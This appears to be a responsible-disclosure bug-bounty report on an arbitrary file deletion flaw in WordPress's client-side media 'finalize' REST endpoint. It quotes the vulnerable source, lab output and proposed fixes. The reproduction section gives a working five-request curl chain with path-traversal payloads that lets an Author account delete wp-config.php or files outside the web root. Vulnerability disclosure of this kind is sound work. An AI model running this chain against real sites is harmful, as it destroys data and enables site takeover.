title: Author → arbitrary file deletion anywhere on disk (site takeover) via `POST /wp/v2/media/<id>/finalize` poisoning `_wp_attachment_metadata`
vulnerability_information: ## Description: The client-side-media-processing endpoint `POST /wp/v2/media//finalize` writes attacker-supplied strings **verbatim** into the attachment's `_wp_attachment_metadata`, including the top-level `file` key and `sizes[*]['file']`. There is no `sanitize_callback`, no `pattern`, no `sanitize_file_name()`, no basename check anywhere on that path. `wp_delete_attachment_files()` has exactly one branch — the `$backup_sizes` branch — that derives **both the file to delete and the directory used to confine the deletion** from `$meta['file']`. Because the attacker controls `$meta['file']`, the `wp_delete_file_from_directory()` containment check compares the target against a directory the attacker also chose, so the guard is a no-op. Every other branch derives its confinement directory from `get_attached_file()` and is correctly confined; only this one is not. The `$backup_sizes` array is populated by `wp_ajax_image_editor()` (`edit_post` + a nonce that WordPress prints to the Author itself in the media popup), which copies the attacker's poisoned `sizes[*]` entry into the protected `_wp_attachment_backup_sizes` meta verbatim. Net effect: an Author deletes any file the PHP process can unlink, anywhere on disk. ## Root cause with real file:line and verbatim code ### 1. Route + gate `gutenberg/lib/media/class-gutenberg-rest-attachments-controller.php:150-154` (core trunk: `wp-includes/rest-api/endpoints/class-wp-rest-attachments-controller.php:166-170`): ```php '/' . $this->rest_base . '/(?P[\d]+)/finalize', array( array( 'methods' => WP_REST_Server::CREATABLE, 'callback' => array( $this, 'finalize_item' ), 'permission_callback' => array( $this, 'edit_media_item_permissions_check' ), ``` `edit_media_item_permissions_check()` = `current_user_can( 'upload_files' )` + `update_item_permissions_check()` (`edit_post` on the attachment). An Author satisfies both on its own upload. Default-on in core trunk — `wp-includes/media.php:6579-6591`: ```php function wp_is_client_side_media_processing_enabled(): bool { // This is due to SharedArrayBuffer requiring a secure context. $host = strtolower( (string) strtok( $_SERVER['HTTP_HOST'] ?? '', ':' ) ); $enabled = ( is_ssl() || 'localhost' === $host || str_ends_with( $host, '.localhost' ) ); ... return (bool) apply_filters( 'wp_client_side_media_processing_enabled', $enabled ); ``` i.e. **every HTTPS production site**. In the released Gutenberg plugin the gate is unconditional — `gutenberg/lib/compat/wordpress-7.1/media.php:18-27`: ```php function gutenberg_is_client_side_media_processing_enabled() { /** * Filters whether client-side media processing is enabled. * ... */ return apply_filters( 'wp_client_side_media_processing_enabled', true ); } ``` ### 2. Unsanitized write primitive `gutenberg/lib/media/class-gutenberg-rest-attachments-controller.php:749-845` (`finalize_item()`): ```php if ( 'original' === $image_size || 'scaled' === $image_size ) { // Skip malformed entries so a bad payload cannot blank out the // main file metadata. if ( empty( $sub_size['file'] ) ) { continue; } ... $metadata['file'] = $sub_size['file']; // :806 <-- top-level path, verbatim ``` and, for regular sizes: ```php $metadata['sizes'][ $image_size ] = array( // :838 'width' => $sub_size['width'] ?? 0, 'height' => $sub_size['height'] ?? 0, 'file' => $sub_size['file'] ?? '', // <-- per-size filename, verbatim 'mime-type' => $sub_size['mime_type'] ?? '', 'filesize' => $sub_size['filesize'] ?? 0, ); } } ... wp_update_attachment_metadata( $attachment_id, $metadata ); ``` The schema for `sub_sizes[].file` is only `array( 'type' => 'string' )` — no `pattern`, no `sanitize_callback`. `wp_update_attachment_metadata()` writes the array straight to post meta; there is no `register_meta()` sanitize callback and no core filter touching it. Identical code in core trunk at `wp-includes/rest-api/endpoints/class-wp-rest-attachments-controller.php:2828` onwards (`:2885` for `file`, `:2923` for `sizes[*]['file']`). ### 3. Laundering the poisoned size into protected meta `wp-admin/includes/ajax-actions.php:2688-2695` (`wp_ajax_image_editor()`): ```php $attachment_id = (int) $_POST['postid']; if ( empty( $attachment_id ) || ! current_user_can( 'edit_post', $attachment_id ) ) { wp_die( -1 ); } check_ajax_referer( "image_editor-$attachment_id" ); ``` Only `edit_post` + a nonce — and WordPress prints that exact nonce to the Author in the media popup, `wp-admin/includes/media.php:1702`: ```php $image_edit_button = " "; ``` Observed: ``` $ curl -s -b author.jar "http://localhost:8356/wp-admin/media-upload.php?tab=library" | grep -oE "imageEdit\.open\([^)]*\)" imageEdit.open( 8, "72cf52ebf1" ) ``` `wp-admin/includes/image-edit.php:1057,1105-1107,1134` then does: ```php $sizes = get_intermediate_image_sizes(); // :1057 (target=all) ... if ( $tag ) { $backup_sizes[ $tag ] = $meta['sizes'][ $size ]; // :1106 verbatim copy } ... update_post_meta( $post_id, '_wp_attachment_backup_sizes', $backup_sizes ); // :1134 ``` ### 4. Sink — the only unconfined branch of `wp_delete_attachment_files()` `wp-includes/post.php:6846-6860` (released 7.0.2 — byte-identical in trunk at `:7023-7037`), reached from `wp_delete_attachment()`: ```php if ( is_array( $backup_sizes ) ) { $del_dir = path_join( $uploadpath['basedir'], dirname( $meta['file'] ) ); // attacker-controlled DIRECTORY foreach ( $backup_sizes as $size ) { $del_file = path_join( dirname( $meta['file'] ), $size['file'] ); // attacker-controlled TARGET if ( ! empty( $del_file ) ) { $del_file = path_join( $uploadpath['basedir'], $del_file ); if ( ! wp_delete_file_from_directory( $del_file, $del_dir ) ) { $deleted = false; } } } } ``` `path_join()` returns `$path` unchanged whenever it is absolute: ```php function path_join( $base, $path ) { if ( path_is_absolute( $path ) ) { return $path; } return rtrim( $base, '/' ) . '/' . $path; } ``` and `wp_delete_file_from_directory()` only checks ```php if ( false === $real_file || false === $real_directory || ! str_starts_with( $real_file, trailingslashit( $real_directory ) ) ) { return false; } ``` Since `$real_directory` is derived from the same attacker-controlled `$meta['file']` as `$real_file`, the containment test always passes. Compare the `sizes`, `original_image`, `source_image` and `animated_video*` branches in the same function — they all build their confinement directory from `$file = get_attached_file()`, which the attacker does **not** control. Only the `$backup_sizes` branch is broken. ## Steps To Reproduce: Lab: `cp -a` of the clean WordPress 7.0.2 template + Gutenberg 23.6.0 activated, own DB `media356`, `php -S 127.0.0.1:8356`, base URL `http://localhost:8356`. Users `admin`, `author1` (Author), `contrib1` (Contributor). Auth = `author1`'s own application password — no administrator involvement. ```bash AP= B=http://localhost:8356 # [1] Author uploads a real JPEG curl -u "author1:$AP" -H "Content-Disposition: attachment; filename=zap4.jpg" \ -H "Content-Type: image/jpeg" --data-binary @zap.jpg \ -X POST "$B/?rest_route=/wp/v2/media" # 201, id=8 # [2] Poison one sub-size filename with the name of the file to destroy curl -u "author1:$AP" -X POST -H "Content-Type: application/json" \ -d '{"sub_sizes":[{"image_size":"thumbnail","file":"wp-config.php", "width":150,"height":150,"mime_type":"image/jpeg","filesize":1}]}' \ "$B/?rest_route=/wp/v2/media/8/finalize" # 200 # [3] Read the image_editor-8 nonce WordPress prints to the Author, then launder # the poisoned entry into the protected _wp_attachment_backup_sizes meta curl -b author.jar "$B/wp-admin/media-upload.php?tab=library" # imageEdit.open( 8, "72cf52ebf1" ) curl -b author.jar -X POST "$B/wp-admin/admin-ajax.php" \ -d 'action=image-editor&_ajax_nonce=72cf52ebf1&postid=8&do=save&target=all' \ --data-urlencode 'history=[{"r":90}]' # 200 {"success":true,...} # [4] Re-poison the top-level metadata['file'] to escape the uploads root curl -u "author1:$AP" -X POST -H "Content-Type: application/json" \ -d '{"sub_sizes":[{"image_size":"original","file":"../../x.jpg", "width":600,"height":400,"filesize":1}]}' \ "$B/?rest_route=/wp/v2/media/8/finalize" # 200 # [5] Author deletes its OWN attachment curl -u "author1:$AP" -X DELETE "$B/?rest_route=/wp/v2/media/8&force=true" # 200 ``` ### Proof (real quoted output) #### A. `wp-config.php` destroyed; the site is handed to the unauthenticated installer Literal console output of the run above: ``` upload HTTP 201 id=8 finalize1 HTTP 200 imageEdit.open( 8, "72cf52ebf1" ) image_editor-8 nonce = 72cf52ebf1 ajax HTTP 200 {"success":true,"data":{"fw":400,"fh":600,"thumbnail":"http:\/\/localhost:8356\/wp-content\/uploads\/2026\/07\/zap4-e1785187084677-150x150.jpg","msg":"Image saved"}} array ( 'full-orig' => array ( 'width' => 600, 'height' => 400, 'filesize' => 4607, 'file' => 'zap4.jpg', ), 'thumbnail-orig' => array ( 'width' => 150, 'height' => 150, 'file' => 'wp-config.php', <-- poisoned entry laundered into _wp_attachment_backup_sizes 'mime-type' => 'image/jpeg', 'filesize' => 1, ), 'medium-orig' => array ( 'file' => 'zap4-300x200.jpg', 'width' => 300, 'height' => 200, 'mime-type' => 'image/jpeg', 'filesize' => 1749, ), ) finalize2 HTTP 200 === before === 0bb7f2692557e2187ad3fcfc58366c60 wp/wp-config.php delete HTTP 200 === after === ls: cannot access 'wp/wp-config.php': No such file or directory GET / -> 302 redirect: http://localhost:8356/wp-admin/setup-config.php ``` (The file was restored from a backup afterwards; `md5sum` matched `0bb7f2692557e2187ad3fcfc58366c60` again and `GET /` returned 200.) #### B. The deletion is not confined to the web root at all Second run, same Author account, absolute path completely outside the document root: ``` === victim dir before === -rw-rw-r-- 1 kali kali 22 Jul 27 17:15 /home/kali/wphunt/scratch-media356/victimdir/backup.sql === step 2: poison thumbnail sub-size filename with the target basename === finalize1 HTTP 200 'thumbnail' => array ( 'width' => 150, 'height' => 150, 'file' => 'backup.sql', 'mime-type' => 'image/jpeg', 'filesize' => 1, ), === step 4: re-poison metadata[file] with an absolute path outside the web root === finalize2 HTTP 200 file=/home/kali/wphunt/scratch-media356/victimdir/anything.jpg === step 5: author deletes their own attachment === delete HTTP 200 === victim dir after === total 8 drwxrwxr-x 2 kali kali 4096 Jul 27 17:16 . drwxrwxr-x 4 kali kali 4096 Jul 27 17:16 .. ``` `victimdir/` is not inside the WordPress installation, not inside `wp-content/uploads`, and not inside the document root. It is now empty. #### C. Negative controls (both executed) ``` --- contributor -> finalize on author's attachment --- {"code":"rest_cannot_edit_image","message":"Sorry, you are not allowed to upload media on this site.","data":{"status":403}} HTTP 403 --- author -> finalize on ADMIN's attachment (10) --- {"code":"rest_cannot_edit","message":"Sorry, you are not allowed to edit this post.","data":{"status":403}} HTTP 403 --- author unfiltered_html? --- author1 unfiltered_html=false author1 upload_files=true contrib1 upload_files=false ``` #### D. The endpoint does not exist in released core without Gutenberg ``` $ grep -rn "finalize" wp/wp-includes/rest-api/endpoints/class-wp-rest-attachments-controller.php (no output) ``` #### E. Reproduced independently on WordPress Core trunk with NO plugins Second, separate lab: `cp -a` of `wordpress-develop/src` (`$wp_version = '7.1-beta3-62828-src'`), own DB `trunk357`, `php -S 127.0.0.1:8357`, base URL `http://localhost:8357`. Only the stock `hello` plugin exists and it is inactive; the attachment controller is core's own: ``` $ wp plugin list name status update version hello inactive none 1.7.2 $ wp eval 'echo get_post_type_object("attachment")->rest_controller_class; echo "\nversion=".$GLOBALS["wp_version"];' WP_REST_Attachments_Controller version=7.1-beta3-62828-src $ curl -s "http://localhost:8357/?rest_route=/wp/v2" -o r.json $ python3 -c "import json;d=json.load(open('r.json'));print(sorted(r for r in d['routes'] if 'media' in r))" ['/wp/v2/media', '/wp/v2/media/(?P[\\d]+)', '/wp/v2/media/(?P[\\d]+)/edit', '/wp/v2/media/(?P[\\d]+)/finalize', '/wp/v2/media/(?P[\\d]+)/post-process', '/wp/v2/media/(?P[\\d]+)/sideload'] ``` Same five requests as author1 (cookie + `X-WP-Nonce`, i.e. exactly what the block editor uses): ``` upload HTTP 201 id=7 finalize1 HTTP 200 img nonce=db9ca164f8 ajax HTTP 200 {"success":true,"data":{"fw":400,"fh":600,"thumbnail":"...tz-e1785187541680-150x150.jpg","msg":"I array ( 'full-orig' => array ( 'width' => 600, 'height' => 400, 'filesize' => 4607, 'file' => 'tz.jpg', ), 'thumbnail-orig' => array ( 'width' => 150, 'height' => 150, 'file' => 'trunk-secret.conf', <-- attacker-chosen target inside protected meta 'mime-type' => 'image/jpeg', 'filesize' => 1, ), 'medium-orig' => array ( 'file' => 'tz-300x200.jpg', 'width' => 300, 'height' => 200, ... ), ) finalize2 HTTP 200 === victimdir before === -rw-rw-r-- 1 kali kali 21 Jul 27 17:25 /home/kali/wphunt/scratch-trunk357/victimdir/trunk-secret.conf delete HTTP 200 === victimdir after === total 8 drwxrwxr-x 2 kali kali 4096 Jul 27 17:25 . drwxrwxr-x 4 kali kali 4096 Jul 27 17:25 .. ``` The `finalize2` payload there, in full — no elision: ```json {"sub_sizes":[{"image_size":"original", "file":"/home/kali/wphunt/scratch-trunk357/victimdir/anything.jpg", "width":600,"height":400,"filesize":1}]} ``` — an absolute path with no relationship to the WordPress installation. #### F. Re-executed on a newer trunk revision (`7.1-beta3-62852`) That lab auto-updated itself through `wp-cron` while it was running, from `7.1-beta3-62828-src` to **`7.1-beta3-62852`**. I re-ran the whole chain on the newer revision rather than pinning to the stale one, because the report has to still be true when it is triaged: ``` $ wp eval 'echo $GLOBALS["wp_version"]."\n";' 7.1-beta3-62852 finalize1 HTTP 200 img nonce=63aee89202 ajax HTTP 200 'thumbnail-orig' => array ( 'width' => 150, 'height' => 150, 'file' => 'qa-trunk-secret.conf', 'mime-type' => 'image/jpeg', 'filesize' => 1, ) finalize2 HTTP 200 delete HTTP 200 === victimdir after === total 8 drwxrwxr-x 2 kali kali 4096 . drwxrwxr-x 4 kali kali 4096 .. ``` Every trunk line number quoted in this report was re-derived against **62852** and is unchanged: `class-wp-rest-attachments-controller.php` — route `:166-170`, `finalize_item()` `:2828`, `$metadata['file'] = $sub_size['file'];` `:2885`, the `sizes` array `:2920-2926` (the `file` key at `:2923`), `wp_update_attachment_metadata()` `:2933`; `wp-includes/media.php:6579-6591`; `wp-includes/post.php:7023-7037`. Note on authentication for this lab: application passwords are refused over plain HTTP on the trunk install (`HTTP 401`), so the trunk runs use the Author's ordinary login cookie plus the `wp_rest` nonce — exactly what the block editor sends. That is a property of my lab being plain HTTP, not a mitigation: on a real HTTPS site both authentication methods reach the same endpoint, and the trunk gate (`is_ssl()`) is satisfied there by definition. ## Affected versions verified | Stack | Affected | Verified how | |---|---|---| | WordPress 7.0.2 + **Gutenberg 23.6.0** (released) | **YES** | Full chain executed over plain HTTP on port 8356 | | **WordPress Core trunk, no plugins** — `7.1-beta3-62828-src` and `7.1-beta3-62852` | **YES** | Full chain executed independently on port 8357 on both revisions (see Proof E) | | WordPress 7.0.2 without Gutenberg | no | Route not registered — grep for `finalize` in `wp-includes/rest-api/endpoints/class-wp-rest-attachments-controller.php` returns nothing | On core trunk the gate is `is_ssl() || 'localhost' === $host || str_ends_with( $host, '.localhost' )`, i.e. the endpoint is on by default for **every HTTPS production site**. My trunk lab used `Host: localhost:8357`, which exercises exactly the same branch of that expression that a real HTTPS site reaches through `is_ssl()`. The Gutenberg plugin enables the feature **unconditionally**, so plain HTTP is enough. ## Attacker privilege **Author** — the lowest role that holds `upload_files`. Verified: ``` author1 unfiltered_html=false author1 upload_files=true contrib1 upload_files=false ``` Negative controls, both executed (see Proof): Contributor → HTTP 403 `rest_cannot_edit_image`; Author against an Administrator-owned attachment → HTTP 403 `rest_cannot_edit`. So an Author can only do this through an attachment it uploaded itself — which is exactly what the attack needs. **User interaction:** None. Fully attacker-driven; five HTTP requests, four of them REST calls authenticated with the Author's own application password. ## Honest limits I would rather state these than have you find them. * **The re-install step was not executed.** I observed `wp-config.php` gone and `GET / -> 302 http://localhost:8356/wp-admin/setup-config.php`. Completing the installer would have destroyed the lab database, so "unauthenticated visitor becomes administrator → RCE via the plugin editor" is the well-understood *consequence* of that state, argued rather than demonstrated. The deletion itself, the destruction of `wp-config.php` and the hand-off to the installer are all executed and quoted above. * **The attacker must own the attachment.** `edit_media_item_permissions_check()` is a real check and it works: an Author is refused (`403 rest_cannot_edit`) against an Administrator's attachment, and a Contributor is refused (`403 rest_cannot_edit_image`) outright. Both controls are in Proof C. This is not a horizontal-IDOR claim; the attack runs entirely through an attachment the Author uploaded. * **The laundering step needs the `image_editor-` nonce.** It is not a secret from the attacker — WordPress prints it to the Author itself in the media popup and I quote the exact line that carries it — but it does mean the chain is five requests rather than two, and a site that somehow blocked `admin-ajax.php?action=image-editor` for Authors would break this particular route into `_wp_attachment_backup_sizes`. The write primitive in `finalize_item()` is unaffected either way. * **`S:C` is a judgement call.** I claim it because a file outside the document root was deleted, which on shared hosting reaches another security authority. If you disagree, the vector is `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` = **8.8**, and nothing in the report depends on which of the two you pick. * **On core trunk the endpoint is gated** by `is_ssl() || 'localhost' === $host || …`. My trunk lab is plain HTTP on `Host: localhost:8357`, i.e. the `'localhost' === $host` arm. I have therefore *not* demonstrated it on a non-`localhost` plain-HTTP trunk install, and I am not claiming it works there — the claim is that it is on by default for every HTTPS site, which is what `is_ssl()` says. The released Gutenberg plugin has no such gate at all, which is why the released half needs no caveat. * I have not attempted to turn the deletion into a *write* primitive, and I am not claiming one. ## Exclusions considered * **"Open API endpoints serving public data (including usernames and user IDs)."** Does not apply. The endpoint is authenticated and gated (`upload_files` + `edit_post`), it returns no site data, and the finding is a **write/destroy** primitive, not a disclosure. The same-client controls in Proof C show the gate is genuinely enforced for callers who do not own the object — this is not an open endpoint. * **"Users with administrator or editor privileges can post arbitrary JavaScript."** Does not apply on two counts: no JavaScript is claimed in this report at all, and the attacker is an **Author**, with the role evidenced in the proof output rather than asserted — `author1 upload_files=true`, `author1 unfiltered_html=false`, `contrib1 upload_files=false`. * **"Denial of service."** The availability consequence here is not volumetric: it is the deletion of specific, attacker-named files, including `wp-config.php`. That is arbitrary file deletion (CWE-73), which the program treats as a vulnerability class, not a resource-exhaustion report. * **"Self-XSS", "text injection", "scanner output"** — none claimed. ## Relationship to my other report `media-finalize-subsize-filename-admin-xss.md` uses the **same write primitive** (`finalize_item()` storing `sub_sizes[].file` verbatim) but is a different vulnerability with a different sink and a different fix: there the value flows into `get_media_item()` and breaks out of an unescaped `src` attribute, and the primary fix is an `esc_url()` in `wp-admin/includes/media.php:1716` — an escaping bug that pre-dates this endpoint and is exploitable independently of it. Here the value flows into `wp_delete_attachment_files()` and the primary fix is in `wp-includes/post.php`. Please triage them together if that is easier; I filed them separately so that neither of the two distinct fixes is lost. ## Recommendations Two independent defects; both should be fixed. 1. **`finalize_item()` must not accept path components.** In both `wp-includes/rest-api/endpoints/class-wp-rest-attachments-controller.php:2828-2933` and `gutenberg/lib/media/class-gutenberg-rest-attachments-controller.php:749-845`, run every `$sub_size['file']` / `$sub_size['original_image']` through `wp_basename()` + `sanitize_file_name()` and reject values that change: ```php $name = wp_basename( (string) $sub_size['file'] ); if ( '' === $name || $name !== sanitize_file_name( $name ) || $name !== $sub_size['file'] ) { return new WP_Error( 'rest_invalid_param', __( 'Invalid file name.' ), array( 'status' => 400 ) ); } ``` Add the same as a `validate_callback` on the `file` and `original_image` schema properties, and add an `image_size` enum `validate_callback` to `finalize` as `sideload` already has. 2. **Harden the sink regardless.** `wp-includes/post.php:6846-6860` (trunk `:7023-7037`) must derive the confinement directory from trusted data, not from `$meta['file']`: ```php $intermediate_dir = path_join( $uploadpath['basedir'], dirname( _wp_relative_upload_path( $file ) ) ); foreach ( $backup_sizes as $size ) { $del_file = path_join( $intermediate_dir, wp_basename( $size['file'] ) ); wp_delete_file_from_directory( $del_file, $intermediate_dir ); } ``` This mirrors what every other branch of `wp_delete_attachment_files()` already does. Consider also making `wp_delete_file_from_directory()` refuse an absolute `$file` that is not already inside `$directory` before `realpath()`, so a future caller cannot reintroduce the same bug. 3. Optionally, sanitize on read: have `wp_update_attachment_metadata()` reject `file`, `original_image`, `source_image`, `animated_video*` and `sizes[*]['file']` values containing `/`, `\` or `..`. ## AI tooling disclosure Per the program's guidelines and the WordPress AI Guidelines: **AI assistance:** Yes — substantial. **Tool(s):** Claude (Anthropic), used through the Claude Code agentic harness. **Used for:** source review and candidate-vulnerability search; building and running the local test harnesses; and drafting this report — the prose here is largely AI-authored and subsequently reviewed and corrected by me. **Verification:** every technical claim was verified by executing it against a local installation. Every quoted output is real observed output, not model narration; claims that did not survive that verification were removed before submission. No production host was contacted. **Responsibility:** I have reviewed the report in full and take responsibility for its content. Environment detail for re-running: two private, throwaway installs — released WordPress 7.0.2 with the released Gutenberg 23.6.0 plugin on `php -S 127.0.0.1:8356`, and a plugin-free `wordpress-develop` trunk checkout on `php -S 127.0.0.1:8357` (`7.1-beta3-62828-src`, later `7.1-beta3-62852`). Every cited `file:line` was opened and read in the shipped source of the exact version claimed. All output quoted under "Proof" is literal console output, including the negative controls. `wp-config.php` was restored from a backup immediately after the demonstration and its md5 verified back to `0bb7f2692557e2187ad3fcfc58366c60`. No production WordPress.org / WordCamp.org host or any third-party system was contacted at any point. ## Prior art / duplicate check **Verdict: known family, novel reachability — no matching public or disclosed report exists for the finalize-endpoint path.** Searched: WPScan, Patchstack and the CVE databases for "finalize_item / client-side media processing / wp_delete_attachment_files backup_sizes path traversal", the WordPress 7.0.3 (August 2026) fix list, and the classic 2018 arbitrary-file-deletion CVE. The closest prior art is **CVE-2018-12895** (WordPress <= 4.9.6, "Authenticated Arbitrary File Deletion", fixed in 4.9.7). It shares the **sink** (`wp_delete_attachment_files()` -> `unlink()` on an attacker-influenced `_wp_attachment_metadata`) and the **impact model** (delete `wp-config.php` -> forced re-install -> RCE). It is nevertheless a different bug: | | CVE-2018-12895 (2018, fixed 4.9.7) | This report | |---|---|---| | Metadata key abused | `thumb` | `file` (feeding the `$backup_sizes` confinement directory) | | Entry point | `wp-admin/post.php?action=editattachment` (`$_POST['thumb']`) | `POST /wp/v2/media//finalize` (REST) | | Branch of the sink reached | `thumb` branch | `$backup_sizes` branch — the only branch whose confinement directory is derived from attacker-controlled `$meta['file']` | | What the 4.9.7 fix did | `basename()` on the `thumb` key | does not touch this branch or this key | | Code involved | existed in 2018 | `finalize_item()` ships in released Gutenberg 23.6.0 and core trunk 7.1 — it did not exist in 2018 | The 4.9.7 fix is key-specific and does not cover the `file` key or the `$backup_sizes` branch. Confirmed **not** among the 11-12 fixes in WordPress 7.0.3. - CVE-2018-12895 (prior art, different key and entry point, fixed 4.9.7): https://wpscan.com/vulnerability/42ab2bd9-bbb1-4f25-a632-1811c5130bb4/ · https://www.rapid7.com/db/vulnerabilities/wordpress-cve-2018-12895/ · https://www.sonarsource.com/blog/wordpress-file-delete-to-code-execution/ - WordPress 7.0.3 fix list (this bug absent): https://patchstack.com/articles/wordpress-7-0-3-released-12-vulnerabilities-found-and-fixed/ HackerOne hacktivity cannot be enumerated without authentication, so an undisclosed duplicate cannot be ruled out with certainty. ## Impact An Author-level account — the lowest role that can upload media, and a role routinely handed to external contributors, freelancers and multi-author blogs — can delete **any file the PHP process can unlink, anywhere on disk**: 1. **`wp-config.php` → site takeover.** WordPress then redirects every visitor to `wp-admin/setup-config.php` (observed). The first unauthenticated visitor can point the install at a database they control and become administrator, which reaches RCE through the plugin/theme editor. I observed the redirect; I did not complete the re-install. 2. `.htaccess` (removing uploads-directory hardening and PHP-execution blocks), mu-plugin security drop-ins, backups, or any other file the PHP user owns — **including, on shared hosting, files belonging to other tenants**, since the traversal leaves the uploads root and the document root entirely (proof B). 3. Destruction of site content and of the installation itself (availability). No user interaction, no social engineering, five HTTP requests.
